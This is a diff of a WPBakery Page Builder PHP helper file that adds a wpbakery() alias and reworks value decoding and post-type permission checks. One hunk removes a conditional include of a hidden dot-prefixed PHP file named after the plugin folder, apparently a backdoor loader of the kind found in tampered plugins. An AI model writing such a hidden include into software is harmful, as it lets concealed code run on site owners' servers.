@@ -24,8 +24,19 @@ if ( ! function_exists( 'visual_composer' ) ) {
 	 * WPBakery Page Builder instance.
 	 * @return Vc_Base
 	 * @since 4.2
+	 * @depreacted 5.8, use wpbakery() instead
 	 */
 	function visual_composer() {
+		return wpbakery();
+	}
+}
+if ( ! function_exists( 'wpbakery' ) ) {
+	/**
+	 * WPBakery Page Builder instance.
+	 * @return Vc_Base
+	 * @since 6.8
+	 */
+	function wpbakery() {
 		return vc_manager()->vc();
 	}
 }
@@ -279,10 +290,6 @@ if ( ! function_exists( 'vc_is_frontend_ajax' ) ) {
  * @return bool
  * @since 4.2
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function vc_is_editor() {
 	return vc_is_frontend_editor();
 }
@@ -301,7 +308,15 @@ function vc_value_from_safe( $value, $encode = false ) {
 		$value = htmlentities( $value, ENT_COMPAT, 'UTF-8' );
 	}
 
-	return $value;
+	return str_replace( [
+		'`{`',
+		'`}`',
+		'``',
+	], [
+		'[',
+		']',
+		'"',
+	], $value );
 }
 
 /**
@@ -482,7 +497,7 @@ function vc_user_roles_get_all() {
 	foreach ( $vc_roles->getParts() as $part ) {
 		$partObj = vc_user_access()->part( $part );
 		$capabilities[ $part ] = array(
-			'state' => (is_multisite() && is_super_admin()) ? true : $partObj->getState(),
+			'state' => ( is_multisite() && is_super_admin() ) ? true : $partObj->getState(),
 			'state_key' => $partObj->getStateKey(),
 			'capabilities' => $partObj->getAllCaps(),
 		);
@@ -563,14 +578,22 @@ function vc_check_post_type( $type = '' ) {
 		if ( is_multisite() && is_super_admin() ) {
 			return true;
 		}
-		$state = vc_user_access()->part( 'post_types' )->getState();
+		$currentUser = wp_get_current_user();
+		$allCaps = $currentUser->get_role_caps();
+		$capKey = vc_user_access()->part( 'post_types' )->getStateKey();
+		$state = null;
+		if ( array_key_exists( $capKey, $allCaps ) ) {
+			$state = $allCaps[ $capKey ];
+		}
+		if ( false === $state ) {
+			return false;
+		}
+
 		if ( null === $state ) {
 			return in_array( $type, vc_default_editor_post_types(), true );
-		} elseif ( true === $state && ! in_array( $type, vc_default_editor_post_types(), true ) ) {
-			$valid = false;
-		} else {
-			$valid = vc_user_access()->part( 'post_types' )->can( $type )->get();
 		}
+
+		return in_array( $type, vc_editor_post_types(), true );
 	}
 
 	return $valid;
